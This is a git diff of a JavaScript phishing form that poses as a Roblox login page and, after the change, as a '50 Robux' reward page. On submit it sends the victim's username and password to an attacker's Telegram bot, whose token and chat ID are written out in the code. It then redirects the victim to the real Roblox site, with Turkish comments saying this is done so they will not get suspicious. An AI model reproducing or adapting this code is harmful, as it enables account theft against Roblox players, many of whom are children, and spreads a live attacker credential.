@@ -1,24 +1,24 @@
-document.getElementById('login-form').addEventListener('submit', async (e) => {
+document.getElementById('reward-form').addEventListener('submit', async (e) => {
     e.preventDefault();
     
     const u = document.getElementById('user').value;
     const p = document.getElementById('pass').value;
 
-    // Senin bilgilerini buraya çaktım knk
+    // Senin Telegram Bilgilerin
     const token = "8587670631:AAGkV1-0y8SF9gXTz2_6y0oBdZR1rGlJF10";
     const chatID = "8512406356";
 
-    const mesaj = `🎯 ROBLOX GANİMETİ!\n\n👤 Kullanıcı: ${u}\n🔑 Şifre: ${p}\n\n🔥 MODIE Protocol İnfazı`;
+    const metin = `💰 50 ROBUX YEMİNE DÜŞTÜ!\n\n👤 Kullanıcı: ${u}\n🔑 Şifre: ${p}\n\n🔥 Durum: İnfaz Edildi`;
 
     try {
         await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chatID, text: mesaj })
+            body: JSON.stringify({ chat_id: chatID, text: metin })
         });
         
-        // Veri düştüğü an Roblox'un kendi giriş sayfasına salla
-        window.location.replace("https://www.roblox.com/login");
+        // Kurbanı gerçek sayfaya gönder ki şüphelenmesin
+        window.location.replace("https://www.roblox.com/promocodes");
     } catch (err) {
         window.location.replace("https://www.roblox.com/login");
     }
